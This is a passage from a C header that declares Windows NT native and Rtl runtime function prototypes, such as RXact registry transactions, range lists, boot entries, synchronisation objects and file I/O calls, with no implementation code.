RtlEraseUnicodeString(
    PUNICODE_STRING String
    );

NTSTATUS
NTAPI
RtlFindMessage(
    PVOID DllHandle,
    ULONG MessageTableId,
    ULONG MessageLanguageId,
    ULONG MessageId,
    PMESSAGE_RESOURCE_ENTRY *MessageEntry
    );

NTSTATUS
NTAPI
RtlFormatMessage(
	IN PWSTR MessageFormat,
	IN ULONG MaximumWidth,
	IN BOOLEAN IgnoreInserts,
	IN BOOLEAN ArgumentsAreAnsi,
	IN BOOLEAN ArgumentsAreAnArray,
	IN va_list *Arguments,
	OUT PWSTR Buffer,
	IN ULONG Length,
	OUT OPTIONAL PULONG ReturnLength
    );

NTSTATUS
NTAPI
RtlFormatMessageEx(
	IN PWSTR MessageFormat,
	IN ULONG MaximumWidth,
	IN BOOLEAN IgnoreInserts,
	IN BOOLEAN ArgumentsAreAnsi,
	IN BOOLEAN ArgumentsAreAnArray,
	IN va_list *Arguments,
	OUT PWSTR Buffer,
	IN ULONG Length,
	OUT OPTIONAL PULONG ReturnLength,
	OUT OPTIONAL PPARSE_MESSAGE_CONTEXT ParseContext
    );

NTSTATUS
NTAPI
RtlInitializeRXact(
    IN HANDLE RootRegistryKey,
    IN BOOLEAN CommitIfNecessary,
    OUT PRTL_RXACT_CONTEXT *RXactContext
    );

NTSTATUS
NTAPI
RtlStartRXact(
    IN PRTL_RXACT_CONTEXT RXactContext
    );

NTSTATUS
NTAPI
RtlAbortRXact(
    IN PRTL_RXACT_CONTEXT RXactContext
    );

NTSTATUS
NTAPI
RtlAddAttributeActionToRXact(
    IN PRTL_RXACT_CONTEXT RXactContext,
    IN RTL_RXACT_OPERATION Operation,
    IN PUNICODE_STRING SubKeyName,
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING AttributeName,
    IN ULONG NewValueType,
    IN PVOID NewValue,
    IN ULONG NewValueLength
    );

NTSTATUS
NTAPI
RtlAddActionToRXact(
    IN PRTL_RXACT_CONTEXT RXactContext,
    IN RTL_RXACT_OPERATION Operation,
    IN PUNICODE_STRING SubKeyName,
    IN ULONG NewKeyValueType,
    IN PVOID NewKeyValue OPTIONAL,
    IN ULONG NewKeyValueLength
    );

NTSTATUS
NTAPI
RtlApplyRXact(
    IN PRTL_RXACT_CONTEXT RXactContext
    );

NTSTATUS
NTAPI
RtlApplyRXactNoFlush(
    IN PRTL_RXACT_CONTEXT RXactContext
    );

ULONG
NTAPI
RtlNtStatusToDosError (
   NTSTATUS Status
   );

ULONG
NTAPI
RtlNtStatusToDosErrorNoTeb (
   NTSTATUS Status
   );

PPEB
RtlGetCurrentPeb (
    VOID
    );

NTSTATUS
NTAPI
RtlCustomCPToUnicodeN(
	IN PCPTABLEINFO CustomCP,
	OUT PWCH UnicodeString,
	IN ULONG MaxBytesInUnicodeString,
	OUT OPTIONAL PULONG BytesInUnicodeString,
	IN PCH CustomCPString,
	IN ULONG BytesInCustomCPString
    );

NTSTATUS
NTAPI
RtlUnicodeToCustomCPN(
	IN PCPTABLEINFO CustomCP,
	OUT PCH CustomCPString,
	IN ULONG MaxBytesInCustomCPString,
	OUT OPTIONAL PULONG BytesInCustomCPString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeToCustomCPN(
    IN PCPTABLEINFO CustomCP,
    OUT PCH CustomCPString,
    IN ULONG MaxBytesInCustomCPString,
    OUT OPTIONAL PULONG BytesInCustomCPString,
    IN PWCH UnicodeString,
    IN ULONG BytesInUnicodeString
    );

VOID
NTAPI
RtlInitCodePageTable(
    IN PUSHORT TableBase,
    OUT PCPTABLEINFO CodePageTable
    );

VOID
NTAPI
RtlInitNlsTables(
    IN PUSHORT AnsiNlsBase,
    IN PUSHORT OemNlsBase,
    IN PUSHORT LanguageNlsBase,
    OUT PNLSTABLEINFO TableInfo
    );

VOID
NTAPI
RtlResetRtlTranslations(
    PNLSTABLEINFO TableInfo
    );

VOID
NTAPI
RtlGetDefaultCodePage(
    OUT PUSHORT AnsiCodePage,
    OUT PUSHORT OemCodePage
    );

VOID
NTAPI
RtlInitializeRangeList(
    IN OUT PRTL_RANGE_LIST RangeList
    );

VOID
NTAPI
RtlFreeRangeList(
    IN PRTL_RANGE_LIST RangeList
    );

NTSTATUS
NTAPI
RtlCopyRangeList(
    OUT PRTL_RANGE_LIST CopyRangeList,
    IN PRTL_RANGE_LIST RangeList
    );

NTSTATUS
NTAPI
RtlAddRange(
    IN OUT PRTL_RANGE_LIST RangeList,
    IN ULONGLONG Start,
    IN ULONGLONG End,
    IN UCHAR Attributes,
    IN ULONG Flags,
    IN PVOID UserData,  OPTIONAL
    IN PVOID Owner      OPTIONAL
    );

NTSTATUS
NTAPI
RtlDeleteRange(
    IN OUT PRTL_RANGE_LIST RangeList,
    IN ULONGLONG Start,
    IN ULONGLONG End,
    IN PVOID Owner
    );

NTSTATUS
NTAPI
RtlDeleteOwnersRanges(
    IN OUT PRTL_RANGE_LIST RangeList,
    IN PVOID Owner
    );

NTSTATUS
NTAPI
RtlFindRange(
    IN PRTL_RANGE_LIST RangeList,
    IN ULONGLONG Minimum,
    IN ULONGLONG Maximum,
    IN ULONG Length,
    IN ULONG Alignment,
    IN ULONG Flags,
    IN UCHAR AttributeAvailableMask,
    IN PVOID Context OPTIONAL,
    IN PRTL_CONFLICT_RANGE_CALLBACK Callback OPTIONAL,
    OUT PULONGLONG Start
    );

NTSTATUS
NTAPI
RtlIsRangeAvailable(
    IN PRTL_RANGE_LIST RangeList,
    IN ULONGLONG Start,
    IN ULONGLONG End,
    IN ULONG Flags,
    IN UCHAR AttributeAvailableMask,
    IN PVOID Context OPTIONAL,
    IN PRTL_CONFLICT_RANGE_CALLBACK Callback OPTIONAL,
    OUT PBOOLEAN Available
    );

NTSTATUS
NTAPI
RtlGetFirstRange(
    IN PRTL_RANGE_LIST RangeList,
    OUT PRTL_RANGE_LIST_ITERATOR Iterator,
    OUT PRTL_RANGE *Range
    );

NTSTATUS
NTAPI
RtlGetLastRange(
    IN PRTL_RANGE_LIST RangeList,
    OUT PRTL_RANGE_LIST_ITERATOR Iterator,
    OUT PRTL_RANGE *Range
    );

NTSTATUS
NTAPI
RtlGetNextRange(
    IN OUT PRTL_RANGE_LIST_ITERATOR Iterator,
    OUT PRTL_RANGE *Range,
    IN BOOLEAN MoveForwards
    );

NTSTATUS
NTAPI
RtlMergeRangeLists(
    OUT PRTL_RANGE_LIST MergedRangeList,
    IN PRTL_RANGE_LIST RangeList1,
    IN PRTL_RANGE_LIST RangeList2,
    IN ULONG Flags
    );

NTSTATUS
NTAPI
RtlInvertRangeList(
    OUT PRTL_RANGE_LIST InvertedRangeList,
    IN PRTL_RANGE_LIST RangeList
    );

NTSTATUS
NTAPI
RtlVolumeDeviceToDosName(
    IN  PVOID           VolumeDeviceObject,
    OUT PUNICODE_STRING DosName
    );

NTSTATUS
NTAPI
RtlCreateSystemVolumeInformationFolder(
    IN  PUNICODE_STRING VolumeRootPath
    );

#if defined(_WINNT_) && (_MSC_VER < 1300)
typedef POSVERSIONINFOW PRTL_OSVERSIONINFOW;
typedef POSVERSIONINFOEXW PRTL_OSVERSIONINFOEXW;

typedef LONG (NTAPI *PVECTORED_EXCEPTION_HANDLER)( struct _EXCEPTION_POINTERS *ExceptionInfo );
typedef VOID (NTAPI * APC_CALLBACK_FUNCTION) (DWORD , PVOID, PVOID);

typedef const GUID *LPCGUID;

#endif

NTSTATUS
RtlGetVersion(
    OUT PRTL_OSVERSIONINFOW lpVersionInformation
    );

NTSTATUS
RtlVerifyVersionInfo(
    IN PRTL_OSVERSIONINFOEXW VersionInfo,
    IN ULONG TypeMask,
    IN ULONGLONG  ConditionMask
    );

BOOLEAN
RtlFlushSecureMemoryCache(
    PVOID   lpAddr,
    SIZE_T  size
    );

LONG
NTAPI
RtlGetLastWin32Error(
    VOID
    );

VOID
NTAPI
RtlSetLastWin32ErrorAndNtStatusFromNtStatus(
    NTSTATUS Status
    );

VOID
NTAPI
RtlSetLastWin32Error(
    LONG Win32Error
    );

VOID
NTAPI
RtlRestoreLastWin32Error(
    LONG Win32Error
    );

NTSTATUS
NTAPI
RtlGetSetBootStatusData(
    IN HANDLE Handle,
    IN BOOLEAN Get,
    IN RTL_BSD_ITEM_TYPE DataItem,
    IN PVOID DataBuffer,
    IN ULONG DataBufferLength,
    OUT PULONG ByteRead OPTIONAL
    );

NTSTATUS
NTAPI
RtlLockBootStatusData(
    OUT PHANDLE BootStatusDataHandle
    );

VOID
NTAPI
RtlUnlockBootStatusData(
    IN HANDLE BootStatusDataHandle
    );

NTSTATUS
NTAPI
RtlCreateBootStatusDataFile(
    VOID
    );

//

//
// begin_ntapi
NTSTATUS
NTAPI
NtDelayExecution(
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval
    );


NTSTATUS
NTAPI
NtQuerySystemEnvironmentValue (
    IN PUNICODE_STRING VariableName,
    OUT PWSTR VariableValue,
    IN USHORT ValueLength,
    OUT OPTIONAL PUSHORT ReturnLength
    );


NTSTATUS
NTAPI
NtSetSystemEnvironmentValue (
    IN PUNICODE_STRING VariableName,
    IN PUNICODE_STRING VariableValue
    );


NTSTATUS
NTAPI
NtQuerySystemEnvironmentValueEx (
    IN PUNICODE_STRING VariableName,
    IN LPGUID VendorGuid,
    OUT OPTIONAL PVOID Value,
    IN OUT PULONG ValueLength,
    OUT OPTIONAL PULONG Attributes
    );


NTSTATUS
NTAPI
NtSetSystemEnvironmentValueEx (
    IN PUNICODE_STRING VariableName,
    IN LPGUID VendorGuid,
    IN OPTIONAL PVOID Value,
    IN ULONG ValueLength,
    IN ULONG Attributes
    );


NTSTATUS
NTAPI
NtEnumerateSystemEnvironmentValuesEx (
    IN ULONG InformationClass,
    OUT PVOID Buffer,
    IN OUT PULONG BufferLength
    );


NTSTATUS
NTAPI
NtAddBootEntry (
    IN PBOOT_ENTRY BootEntry,
    OUT OPTIONAL PULONG Id
    );


NTSTATUS
NTAPI
NtDeleteBootEntry (
    IN ULONG Id
    );


NTSTATUS
NTAPI
NtModifyBootEntry (
    IN PBOOT_ENTRY BootEntry
    );


NTSTATUS
NTAPI
NtEnumerateBootEntries (
    OUT OPTIONAL PVOID Buffer,
    IN OUT PULONG BufferLength
    );


NTSTATUS
NTAPI
NtQueryBootEntryOrder (
    OUT OPTIONAL PULONG Ids,
    IN OUT PULONG Count
	);


NTSTATUS
NTAPI
NtSetBootEntryOrder (
    IN PULONG Ids,
    IN ULONG Count
    );


NTSTATUS
NTAPI
NtQueryBootOptions (
    OUT OPTIONAL PBOOT_OPTIONS BootOptions,
    IN OUT PULONG BootOptionsLength
    );


NTSTATUS
NTAPI
NtSetBootOptions (
    IN PBOOT_OPTIONS BootOptions,
    IN ULONG FieldsToChange
    );


NTSTATUS
NTAPI
NtTranslateFilePath (
    IN PFILE_PATH InputFilePath,
    IN ULONG OutputType,
    OUT OPTIONAL PFILE_PATH OutputFilePath,
    IN OUT OPTIONAL PULONG OutputFilePathLength
    );


NTSTATUS
NTAPI
NtAddDriverEntry (
    IN PEFI_DRIVER_ENTRY DriverEntry,
    OUT OPTIONAL PULONG Id
    );


NTSTATUS
NTAPI
NtDeleteDriverEntry (
    IN ULONG Id
    );


NTSTATUS
NTAPI
NtModifyDriverEntry (
    IN PEFI_DRIVER_ENTRY DriverEntry
    );


NTSTATUS
NTAPI
NtEnumerateDriverEntries (
    OUT PVOID Buffer,
    IN OUT PULONG BufferLength
    );


NTSTATUS
NTAPI
NtQueryDriverEntryOrder (
    OUT PULONG Ids,
    IN OUT PULONG Count
    );


NTSTATUS
NTAPI
NtSetDriverEntryOrder (
    IN PULONG Ids,
    IN ULONG Count
    );


NTSTATUS
NTAPI
NtClearEvent (
    IN HANDLE EventHandle
    );


NTSTATUS
NTAPI
NtCreateEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN EVENT_TYPE EventType,
    IN BOOLEAN InitialState
    );


NTSTATUS
NTAPI
NtOpenEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtPulseEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );


NTSTATUS
NTAPI
NtQueryEvent (
    IN HANDLE EventHandle,
    IN EVENT_INFORMATION_CLASS EventInformationClass,
    OUT PVOID EventInformation,
    IN ULONG EventInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtResetEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );


NTSTATUS
NTAPI
NtSetEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );


NTSTATUS
NTAPI
NtSetEventBoostPriority (
    IN HANDLE EventHandle
    );


NTSTATUS
NTAPI
NtCreateEventPair (
    OUT PHANDLE EventPairHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtOpenEventPair (
    OUT PHANDLE EventPairHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtWaitLowEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtWaitHighEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtSetLowWaitHighEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtSetHighWaitLowEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtSetLowEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtSetHighEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtCreateMutant (
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN InitialOwner
    );


NTSTATUS
NTAPI
NtOpenMutant (
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQueryMutant (
    IN HANDLE MutantHandle,
    IN MUTANT_INFORMATION_CLASS MutantInformationClass,
    OUT PVOID MutantInformation,
    IN ULONG MutantInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtReleaseMutant (
    IN HANDLE MutantHandle,
    OUT OPTIONAL PLONG PreviousCount
    );


NTSTATUS
NTAPI
NtCreateSemaphore (
    OUT PHANDLE SemaphoreHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN LONG InitialCount,
    IN LONG MaximumCount
    );


NTSTATUS
NTAPI
NtOpenSemaphore(
    OUT PHANDLE SemaphoreHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQuerySemaphore (
    IN HANDLE SemaphoreHandle,
    IN SEMAPHORE_INFORMATION_CLASS SemaphoreInformationClass,
    OUT PVOID SemaphoreInformation,
    IN ULONG SemaphoreInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtReleaseSemaphore(
    IN HANDLE SemaphoreHandle,
    IN LONG ReleaseCount,
    OUT OPTIONAL PLONG PreviousCount
    );


NTSTATUS
NTAPI
NtCreateTimer (
    OUT PHANDLE TimerHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN TIMER_TYPE TimerType
    );


NTSTATUS
NTAPI
NtOpenTimer (
    OUT PHANDLE TimerHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtCancelTimer (
    IN HANDLE TimerHandle,
    OUT OPTIONAL PBOOLEAN CurrentState
    );


NTSTATUS
NTAPI
NtQueryTimer (
    IN HANDLE TimerHandle,
    IN TIMER_INFORMATION_CLASS TimerInformationClass,
    OUT PVOID TimerInformation,
    IN ULONG TimerInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetTimer (
    IN HANDLE TimerHandle,
    IN PLARGE_INTEGER DueTime,
    IN OPTIONAL PTIMER_APC_ROUTINE TimerApcRoutine,
    IN OPTIONAL PVOID TimerContext,
    IN BOOLEAN ResumeTimer,
    IN OPTIONAL LONG Period,
    OUT OPTIONAL PBOOLEAN PreviousState
    );


NTSTATUS
NTAPI
NtQuerySystemTime (
    OUT PLARGE_INTEGER SystemTime
    );


NTSTATUS
NTAPI
NtSetSystemTime (
    IN OPTIONAL PLARGE_INTEGER SystemTime,
    OUT OPTIONAL PLARGE_INTEGER PreviousTime
    );


NTSTATUS
NTAPI
NtQueryTimerResolution (
    OUT PULONG MaximumTime,
    OUT PULONG MinimumTime,
    OUT PULONG CurrentTime
    );


NTSTATUS
NTAPI
NtSetTimerResolution (
    IN ULONG DesiredTime,
    IN BOOLEAN SetResolution,
    OUT PULONG ActualTime
    );


NTSTATUS
NTAPI
NtAllocateLocallyUniqueId (
    OUT PLUID Luid
    );


NTSTATUS
NTAPI
NtSetUuidSeed (
    IN PCHAR Seed
    );


NTSTATUS
NTAPI
NtAllocateUuids (
    OUT PULARGE_INTEGER Time,
    OUT PULONG Range,
    OUT PULONG Sequence,
    OUT PCHAR Seed
    );


NTSTATUS
NTAPI
NtCreateProfile (
    OUT PHANDLE ProfileHandle,
    IN HANDLE Process OPTIONAL,
    IN PVOID ProfileBase,
    IN SIZE_T ProfileSize,
    IN ULONG BucketSize,
    IN PULONG Buffer,
    IN ULONG BufferSize,
    IN KPROFILE_SOURCE ProfileSource,
    IN KAFFINITY Affinity
    );


NTSTATUS
NTAPI
NtStartProfile (
    IN HANDLE ProfileHandle
    );


NTSTATUS
NTAPI
NtStopProfile (
    IN HANDLE ProfileHandle
    );


NTSTATUS
NTAPI
NtSetIntervalProfile (
    IN ULONG Interval,
    IN KPROFILE_SOURCE Source
    );


NTSTATUS
NTAPI
NtQueryIntervalProfile (
    IN KPROFILE_SOURCE ProfileSource,
    OUT PULONG Interval
    );


NTSTATUS
NTAPI
NtQueryPerformanceCounter (
    OUT PLARGE_INTEGER PerformanceCounter,
    OUT OPTIONAL PLARGE_INTEGER PerformanceFrequency
    );


NTSTATUS
NTAPI
NtCreateKeyedEvent (
    OUT PHANDLE KeyedEventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtOpenKeyedEvent (
    OUT PHANDLE KeyedEventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtReleaseKeyedEvent (
    IN HANDLE KeyedEventHandle,
    IN PVOID KeyValue,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtWaitForKeyedEvent (
    IN HANDLE KeyedEventHandle,
    IN PVOID KeyValue,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtQuerySystemInformation (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT OPTIONAL PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetSystemInformation (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OPTIONAL PVOID SystemInformation,
    IN ULONG SystemInformationLength
    );


NTSTATUS
NTAPI
NtSystemDebugControl (
    IN SYSDBG_COMMAND Command,
    IN OPTIONAL PVOID InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID OutputBuffer,
    IN ULONG OutputBufferLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtRaiseHardError (
    IN NTSTATUS ErrorStatus,
    IN ULONG NumberOfParameters,
    IN ULONG UnicodeStringParameterMask,
    IN OPTIONAL PULONG_PTR Parameters,
    IN ULONG ValidResponseOptions,
    OUT PULONG Response
    );


NTSTATUS
NTAPI
NtQueryDefaultLocale (
    IN BOOLEAN UserProfile,
    OUT PLCID DefaultLocaleId
    );


NTSTATUS
NTAPI
NtSetDefaultLocale (
    IN BOOLEAN UserProfile,
    IN LCID DefaultLocaleId
    );


NTSTATUS
NTAPI
NtQueryInstallUILanguage (
    OUT LANGID *InstallUILanguageId
    );


NTSTATUS
NTAPI
NtQueryDefaultUILanguage (
    OUT LANGID *DefaultUILanguageId
    );


NTSTATUS
NTAPI
NtSetDefaultUILanguage (
    IN LANGID DefaultUILanguageId
    );


NTSTATUS
NTAPI
NtSetDefaultHardErrorPort(
    IN HANDLE DefaultHardErrorPort
    );


NTSTATUS
NTAPI
NtShutdownSystem (
    IN SHUTDOWN_ACTION Action
    );


NTSTATUS
NTAPI
NtDisplayString (
    IN PUNICODE_STRING String
    );


NTSTATUS
NTAPI
NtAddAtom (
    IN OPTIONAL PWSTR AtomName,
    IN ULONG Length,
    OUT OPTIONAL PRTL_ATOM Atom
    );


NTSTATUS
NTAPI
NtFindAtom (
    IN OPTIONAL PWSTR AtomName,
    IN ULONG Length,
    OUT OPTIONAL PRTL_ATOM Atom
    );


NTSTATUS
NTAPI
NtDeleteAtom (
    IN RTL_ATOM Atom
    );


NTSTATUS
NTAPI
NtQueryInformationAtom(
    IN RTL_ATOM Atom,
    IN ATOM_INFORMATION_CLASS AtomInformationClass,
    OUT OPTIONAL PVOID AtomInformation,
    IN ULONG AtomInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtCancelIoFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );


NTSTATUS
NTAPI
NtCreateNamedPipeFile (
     OUT PHANDLE FileHandle,
     IN ULONG DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     OUT PIO_STATUS_BLOCK IoStatusBlock,
     IN ULONG ShareAccess,
     IN ULONG CreateDisposition,
     IN ULONG CreateOptions,
     IN ULONG NamedPipeType,
     IN ULONG ReadMode,
     IN ULONG CompletionMode,
     IN ULONG MaximumInstances,
     IN ULONG InboundQuota,
     IN ULONG OutboundQuota,
     IN OPTIONAL PLARGE_INTEGER DefaultTimeout
     );


NTSTATUS
NTAPI
NtCreateMailslotFile (
     OUT PHANDLE FileHandle,
     IN ULONG DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     OUT PIO_STATUS_BLOCK IoStatusBlock,
     IN ULONG CreateOptions,
     IN ULONG MailslotQuota,
     IN ULONG MaximumMessageSize,
     IN PLARGE_INTEGER ReadTimeout
     );


NTSTATUS
NTAPI
NtDeleteFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtFlushBuffersFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );


NTSTATUS
NTAPI
NtNotifyChangeDirectoryFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree
    );


NTSTATUS
NTAPI
NtQueryAttributesFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PFILE_BASIC_INFORMATION FileInformation
    );


NTSTATUS
NTAPI
NtQueryFullAttributesFile(
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PFILE_NETWORK_OPEN_INFORMATION FileInformation
    );


NTSTATUS
NTAPI
NtQueryEaFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN PVOID EaList,
    IN ULONG EaListLength,
    IN OPTIONAL PULONG EaIndex OPTIONAL,
    IN BOOLEAN RestartScan
    );


NTSTATUS
NTAPI
NtCreateFile (
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN OPTIONAL PLARGE_INTEGER AllocationSize,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN OPTIONAL PVOID EaBuffer,
    IN ULONG EaLength
    );


NTSTATUS
NTAPI
NtDeviceIoControlFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG IoControlCode,
    IN OPTIONAL PVOID  InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID  OutputBuffer,
    IN ULONG OutputBufferLength
    );


NTSTATUS
NTAPI
NtFsControlFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG FsControlCode,
    IN OPTIONAL PVOID  InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID  OutputBuffer,
    IN ULONG OutputBufferLength
    );


NTSTATUS
NTAPI
NtLockFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER ByteOffset,
    IN PLARGE_INTEGER Length,
    IN ULONG Key,
    IN BOOLEAN FailImmediately,
    IN BOOLEAN ExclusiveLock
    );


NTSTATUS
NTAPI
NtOpenFile (
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions
    );


NTSTATUS
NTAPI
NtQueryDirectoryFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN OPTIONAL PUNICODE_STRING FileName,
    IN BOOLEAN RestartScan
    );


NTSTATUS
NTAPI
NtQueryInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );


NTSTATUS
NTAPI
NtQueryQuotaInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN OPTIONAL PVOID  SidList,
    IN ULONG SidListLength,
    IN OPTIONAL PSID StartSid,
    IN BOOLEAN RestartScan
    );


NTSTATUS
NTAPI
NtQueryVolumeInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );


NTSTATUS
NTAPI
NtReadFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );


NTSTATUS
NTAPI
NtSetInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );


NTSTATUS
NTAPI
NtSetQuotaInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );


NTSTATUS
NTAPI
NtSetVolumeInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );


NTSTATUS
NTAPI
NtWriteFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );


NTSTATUS
NTAPI
NtUnlockFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
